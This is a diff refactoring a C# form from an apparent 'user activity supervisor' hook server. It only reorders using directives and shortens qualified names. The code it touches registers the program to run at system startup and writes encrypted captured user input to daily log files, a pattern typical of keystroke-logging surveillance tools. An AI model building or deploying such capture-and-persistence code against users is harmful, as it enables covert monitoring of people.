@@ -1,21 +1,23 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Configuration;
-using System.Data;
-using System.Drawing;
-using System.Net;
-using System.Net.Sockets;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-using System.Windows.Forms;
-
-using Nzl.Hook;
-using Nzl.Utils;
-
-namespace Nzl.Test.HookServer
+﻿namespace Nzl.Test.HookServer
 {
+    using System;
+    using System.Collections.Generic;
+    using System.ComponentModel;
+    using System.Configuration;
+    using System.Data;
+    using System.Drawing;
+    using System.Net;
+    using System.Net.Sockets;
+    using System.Runtime.InteropServices;
+    using System.Text;
+    using System.Threading;
+    using System.Windows.Forms;
+    using Nzl.Hook;
+    using Nzl.Utils;
+
+    /// <summary>
+    /// 
+    /// </summary>
     public partial class UserActivitySupervisorServerForm : Form
     {
         #region Variables.
@@ -259,27 +261,27 @@ namespace Nzl.Test.HookServer
                 ////Start on system start up config.
                 if (this._checkStartOnSystemStartup)
                 {
-                    bool startUpFlag = Nzl.Utils.MiscUtil.CheckExistRegisterApp(Application.ProductName);
+                    bool startUpFlag = MiscUtil.CheckExistRegisterApp(Application.ProductName);
                     if (this._startOnSystemStartup)
                     {
                         if (startUpFlag == false)
                         {
-                            Nzl.Utils.MiscUtil.SetRegistryApp(Application.ProductName, Application.ExecutablePath);
+                            MiscUtil.SetRegistryApp(Application.ProductName, Application.ExecutablePath);
                         }
                     }
                     else
                     {
                         if (startUpFlag)
                         {
-                            Nzl.Utils.MiscUtil.DeleteRegisterApp(Application.ProductName);
+                            MiscUtil.DeleteRegisterApp(Application.ProductName);
                         }
                     }
 
-                    Nzl.Utils.FileUtil.WriteText("infor.log",
+                    FileUtil.WriteText("infor.log",
                                                 DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                                                 + "\n\tCheck start on system startup is ON"
                                                 + "\n\tStart on system startup is "
-                                                + (Nzl.Utils.MiscUtil.CheckExistRegisterApp(Application.ProductName) ? "ON" : "OFF")
+                                                + (MiscUtil.CheckExistRegisterApp(Application.ProductName) ? "ON" : "OFF")
                                                 + "\n");
                 }
 
@@ -414,7 +416,7 @@ namespace Nzl.Test.HookServer
         {
             if (string.IsNullOrEmpty(e.Input) == false)
             {
-                Util.FileUtil.WriteText(Application.StartupPath+ "\\" + DateTime.Now.ToString("yyyyMMdd") + ".txt", EncryptUtil.Encrypt(e.Input) + "\n");
+                FileUtil.WriteText(Application.StartupPath+ "\\" + DateTime.Now.ToString("yyyyMMdd") + ".txt", EncryptUtil.Encrypt(e.Input) + "\n");
             }
         }
         #endregion
